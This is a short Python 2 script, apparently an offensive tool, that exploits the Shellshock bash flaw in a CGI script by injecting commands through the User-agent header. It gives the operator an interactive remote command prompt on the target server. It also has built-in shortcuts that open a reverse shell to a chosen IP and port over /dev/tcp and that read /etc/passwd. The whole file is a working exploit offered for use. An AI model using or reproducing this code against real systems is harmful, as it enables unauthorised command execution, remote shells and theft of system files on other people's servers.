#!/usr/bin/python

import urllib2
from sys import argv

if len(argv) != 3:
    exit("Usage: " + argv[0] + " <url/to/vuln/script> <+v(more info)/-v(less info)>")

bin_binaries = ['cat','echo','ls','bash','php','perl','python','rm','touch','mkdir']
commands = ['!tcp', '!passwd']

print "[+] Executing\nKeep in mind: If not using one of the following binarys,  type full path to executable!"
if argv[2] == "+v":
    print 'Use \quit to quit\n'
    print 'Binaries:'
    print '\n'.join(bin_binaries)
    print 'Commands:'
    print '\n'.join(commands)

while 1:
    cmd = raw_input("# ")
    if cmd.split(' ')[0] in bin_binaries:
        cmd = '/bin/' + cmd
    elif cmd == '\quit':
        exit('[!] Quitting...')
    elif cmd == '!tcp':
        ip = raw_input('IP Address: ')
        port = raw_input('Port: ')
        cmd = 'bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1'
    elif cmd == '!passwd':
        cmd = '/bin/cat /etc/passwd'

    ul2 = urllib2.build_opener()
    ul2.addheaders = [
        ('User-agent', '() { :; }; echo ; ' + cmd)
    ]
    response = ul2.open(argv[1])
    for line in response.readlines():
        print line.strip()
